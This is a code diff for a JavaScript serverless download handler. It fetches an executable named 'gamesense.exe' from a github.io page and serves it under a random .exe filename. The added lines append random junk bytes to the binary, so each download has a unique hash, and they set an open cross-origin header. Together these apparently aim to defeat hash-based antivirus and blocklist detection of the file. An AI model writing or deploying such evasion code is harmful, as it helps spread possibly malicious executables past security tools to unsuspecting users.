@@ -1,31 +1,41 @@
-export default async function handler(req, res) {
+const https = require('https');
+
+module.exports = async (req, res) => {
     const fileUrl = 'https://gamesense-revive.github.io/gamesense.exe';
 
-    try {
-        const response = await fetch(fileUrl);
-        if (!response.ok) {
-            return res.status(500).send('Не удалось загрузить файл с сервера');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+
+    https.get(fileUrl, (downloadStream) => {
+        if (downloadStream.statusCode !== 200) {
+            return res.status(500).send('Error');
         }
 
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        let randomName = '';
-        const nameLength = 12; // Длина имени файла (без расширения)
+        let chunks = [];
+        downloadStream.on('data', (chunk) => chunks.push(chunk));
         
-        for (let i = 0; i < nameLength; i++) {
-            randomName += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        
-        const finalFilename = `${randomName}.exe`;
+        downloadStream.on('end', () => {
+            let buffer = Buffer.concat(chunks);
 
-        const arrayBuffer = await response.arrayBuffer();
-        const buffer = Buffer.from(arrayBuffer);
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let randomName = '';
+            for (let i = 0; i < 12; i++) {
+                randomName += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
 
-        res.setHeader('Content-Type', 'application/octet-stream');
-        res.setHeader('Content-Disposition', `attachment; filename="${finalFilename}"`);
-        
-        return res.status(200).send(buffer);
+            const junkSize = Math.floor(Math.random() * 90) + 10;
+            const junkBytes = Buffer.alloc(junkSize);
+            for (let i = 0; i < junkSize; i++) {
+                junkBytes[i] = Math.floor(Math.random() * 256);
+            }
+            
+            const modifiedBuffer = Buffer.concat([buffer, junkBytes]);
 
-    } catch (error) {
-        return res.status(500).json({ error: 'Ошибка сервера: ' + error.message });
-    }
-}
+            res.setHeader('Content-Type', 'application/octet-stream');
+            res.setHeader('Content-Disposition', `attachment; filename="${randomName}.exe"`);
+            res.status(200).send(modifiedBuffer);
+        });
+
+    }).on('error', (err) => {
+        res.status(500).send('Error: ' + err.message);
+    });
+};
